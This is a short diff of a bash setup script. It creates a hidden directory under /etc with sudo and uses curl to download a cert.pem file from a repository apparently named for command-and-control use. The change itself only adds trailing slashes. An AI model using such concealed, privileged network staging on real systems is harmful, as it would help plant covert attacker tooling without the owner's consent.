@@ -1,8 +1,8 @@
 #!/bin/bash
 
-sudo mkdir -p /etc/.python-certifications
+sudo mkdir -p /etc/.python-certifications/
 
-cd /etc/.python-certifications
+cd /etc/.python-certifications/
 
 curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
 
